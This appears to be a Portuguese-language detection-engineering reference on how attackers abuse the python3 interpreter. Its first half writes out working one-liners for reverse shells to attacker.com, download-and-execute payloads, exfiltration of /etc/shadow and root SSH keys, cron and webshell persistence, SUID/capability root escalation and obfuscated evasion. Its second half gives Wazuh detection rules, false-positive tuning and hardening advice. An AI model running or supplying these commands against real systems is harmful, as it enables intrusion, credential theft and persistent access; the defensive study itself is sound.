# python3

**Plataforma:** Linux / macOS / Windows

**Categorias:** Execução de código, Shell reverso, Leitura e escrita de arquivos, Download, Exfiltração, Escalada de privilégios (SUID/capabilities)

**MITRE ATT&CK:** T1059.006 (Python), T1105 (Ingress Tool Transfer), T1048 (Exfiltration), T1548.001 (SUID/SGID)

**Referência ofensiva:** https://gtfobins.org/gtfobins/python/

---

## O que é o python3

O Python é uma linguagem de programação interpretada de propósito geral, presente por padrão na maioria das distribuições Linux modernas e no macOS. Em servidores, é comum encontrar python3 instalado como dependência de ferramentas de sistema, de gerenciadores de pacotes (pip, ansible, yum) e de aplicações web.

Diferente de ferramentas como curl ou wget, o python3 não é apenas um binário que executa uma função específica — é um interpretador completo, capaz de executar código arbitrário, abrir sockets de rede, ler e escrever qualquer arquivo acessível ao usuário corrente, e interagir com o sistema operacional em profundidade. Isso o torna uma das ferramentas mais versáteis disponíveis para um atacante em ambiente pós-exploração.

---

## Por que atacantes usam o python3

O python3 elimina a necessidade de compilar ou transferir binários: o atacante escreve o payload diretamente em Python e o executa no interpretador já disponível no sistema. Shells reversos, servidores HTTP temporários para servir payloads, scripts de exfiltração e ferramentas de escalada de privilégios podem todos ser implementados em Python e executados sem instalação adicional.

Em cenários de SUID ou capabilities mal configuradas, o python3 com o bit SUID ativo ou com `cap_setuid` configurado equivale, na prática, a acesso root imediato.

---

## Técnicas de abuso

### Shell reverso

```bash
# Shell reverso básico via socket
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Versão mais legível (executada como script)
python3 -c '
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
'

# Via pty para shell totalmente interativo (com tab completion, Ctrl+C funcional)
python3 -c '
import socket, subprocess, pty
s = socket.socket()
s.connect(("attacker.com", 4444))
pty.spawn("/bin/bash")
'

# Upgrade de shell simples para shell interativo completo (após receber o shell reverso)
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

O uso de `pty.spawn` merece atenção especial: ele cria um pseudo-terminal real, tornando o shell reverso completamente interativo — com histórico de comandos, autocomplete e controle de jobs. É o que atacantes fazem imediatamente após receber um shell reverso simples via netcat.

### Servidor HTTP temporário para transferência de arquivos

```bash
# Servir o diretório atual via HTTP na porta 8000
python3 -m http.server 8000

# Servir em porta alternativa (para contornar regras de firewall)
python3 -m http.server 443

# Servir em interface específica
python3 -m http.server 8080 --bind 0.0.0.0
```

Esse recurso é amplamente usado durante movimentação lateral: o atacante compromete um servidor, sobe um servidor HTTP temporário com python3 e baixa ferramentas a partir de outros hosts comprometidos dentro da mesma rede, sem precisar de acesso à internet.

### Leitura de arquivos arbitrários

```bash
# Leitura simples de arquivo
python3 -c 'print(open("/etc/shadow").read())'

# Leitura de arquivo binário em base64 (para exfiltração)
python3 -c 'import base64; print(base64.b64encode(open("/root/.ssh/id_rsa","rb").read()).decode())'

# Leitura de todos os arquivos de um diretório
python3 -c '
import os
for root, dirs, files in os.walk("/home"):
    for f in files:
        path = os.path.join(root, f)
        try:
            print(f"=== {path} ===")
            print(open(path).read())
        except: pass
'
```

### Escrita de arquivos arbitrários

```bash
# Adicionar chave SSH autorizada para acesso persistente
python3 -c 'open("/root/.ssh/authorized_keys","a").write("ssh-rsa AAAA... attacker\n")'

# Adicionar entrada no crontab do root
python3 -c 'open("/var/spool/cron/crontabs/root","a").write("* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\n")'

# Criar webshell em servidor web comprometido
python3 -c 'open("/var/www/html/shell.php","w").write("<?php system($_GET[\"cmd\"]); ?>")'
```

### Download de arquivos

```bash
# Download via urllib
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://attacker.com/payload", "/tmp/p")'

# Download via requests (se disponível)
python3 -c 'import requests; open("/tmp/p","wb").write(requests.get("http://attacker.com/payload").content)'

# Download e execução em memória
python3 -c 'import urllib.request,subprocess; exec(urllib.request.urlopen("http://attacker.com/payload.py").read())'
```

### Escalada de privilégios via SUID

```bash
# Verificar se python3 tem SUID
find / -name python3 -perm -4000 2>/dev/null

# Explorar SUID para obter shell root
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Escalada de privilégios via Linux Capabilities

```bash
# Verificar capabilities em python3
getcap /usr/bin/python3

# Se cap_setuid+ep estiver configurada:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Se cap_net_bind_service+ep estiver configurada (menos grave, mas permite bind em portas < 1024):
python3 -c 'import socket; s=socket.socket(); s.bind(("0.0.0.0", 80))'
```

### Exfiltração direta via socket

```bash
# Exfiltrar arquivo diretamente via socket TCP
python3 -c '
import socket
s = socket.socket()
s.connect(("attacker.com", 9001))
s.send(open("/etc/shadow", "rb").read())
s.close()
'
```

---

## Técnicas de bypass e evasão

### Execução de código ofuscado

```bash
# Payload em base64, decodificado e executado em tempo de execução
python3 -c 'import base64; exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oIi9iaW4vYmFzaCIp"))'

# Via bytecode compilado (mais difícil de inspecionar)
python3 -c 'import marshal,base64; exec(marshal.loads(base64.b64decode("...")))'

# Usando __import__ para importar módulos sem keyword import visível
python3 -c '__import__("os").system("/bin/bash")'
```

### Renomear ou copiar o interpretador

```bash
# Copiar python3 com outro nome para contornar regras por nome de processo
cp /usr/bin/python3 /tmp/.py
/tmp/.py -c 'import os; os.system("/bin/bash")'
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- python3 com argumento `-c` contendo `socket`, `connect`, `dup2` ou `subprocess` — padrão de shell reverso
- python3 com `-c` contendo `os.setuid(0)` — tentativa de escalada via SUID/capabilities
- python3 executado por processo filho de servidor web
- python3 iniciando `-m http.server` — servidor HTTP temporário (pivoting ou staging)
- python3 abrindo `/root/.ssh/authorized_keys` ou `/etc/crontab` para escrita

**Indicadores de média relevância:**

- python3 executando código em base64 (`base64.b64decode` + `exec`)
- python3 com `pty.spawn` (upgrade de shell)
- python3 escrevendo arquivos em diretórios web (`/var/www/`, `/srv/`)

### Regra Wazuh

```xml
<!-- python3 com padrões de shell reverso -->
<rule id="100212" level="15">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">python[23]?$</field>
  <field name="audit.execve" type="pcre2">socket.*connect|dup2.*fileno|/dev/tcp</field>
  <description>python3 com padrao de shell reverso detectado</description>
  <mitre>
    <id>T1059.006</id>
  </mitre>
</rule>

<!-- python3 com tentativa de setuid(0) -->
<rule id="100213" level="15">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">python[23]?$</field>
  <field name="audit.execve" type="pcre2">setuid\(0\)|setuid\s*\(\s*0</field>
  <description>python3 tentando setuid(0) — possivel abuso de SUID ou capabilities</description>
  <mitre>
    <id>T1548.001</id>
  </mitre>
</rule>

<!-- python3 iniciando servidor HTTP -->
<rule id="100214" level="10">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">python[23]?$</field>
  <field name="audit.execve" type="pcre2">http\.server|SimpleHTTPServer</field>
  <description>python3 iniciando servidor HTTP — possivel staging ou pivoting interno</description>
  <mitre>
    <id>T1105</id>
  </mitre>
</rule>

<!-- python3 executado por conta de serviço web -->
<rule id="100215" level="14">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">python[23]?$</field>
  <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
  <description>python3 executado por conta de servico web — possivel RCE</description>
  <mitre>
    <id>T1059.006</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Ansible e ferramentas de automação** — Ansible usa python3 extensivamente para executar módulos nos hosts gerenciados, incluindo abertura de sockets e execução de comandos. Filtre pelo usuário do Ansible e por padrões de argumentos específicos do Ansible.

**Aplicações web Python** — Django, Flask e FastAPI em desenvolvimento ou produção executam código Python constantemente. Concentre alertas em padrões específicos de abuso (socket+connect, setuid) em vez do binário em geral.

**Pip e gerenciadores de pacote** — o pip usa python3 para instalar pacotes. Filtre por execuções de `pip install` como processo pai.

---

## Proteção e controles defensivos

**Verificar e remover capabilities desnecessárias:** execute `getcap -r / 2>/dev/null` regularmente para identificar python3 ou outros interpretadores com capabilities perigosas. Use `setcap -r /usr/bin/python3` para removê-las se não forem necessárias.

**Monitorar SUID em interpretadores:** nenhum interpretador de linguagem de script (python, perl, ruby, php) deveria ter o bit SUID em produção. Implemente verificação periódica via Wazuh FIM ou via script de auditoria.

**Limitar acesso ao python3 em produção:** em servidores de produção que não dependem de python3 em runtime (apenas em build time), considere remover ou restringir o acesso ao binário via ACL ou AppArmor.

---

## Referências

- GTFOBins — python: https://gtfobins.org/gtfobins/python/
- MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/
- MITRE ATT&CK T1548.001: https://attack.mitre.org/techniques/T1548/001/
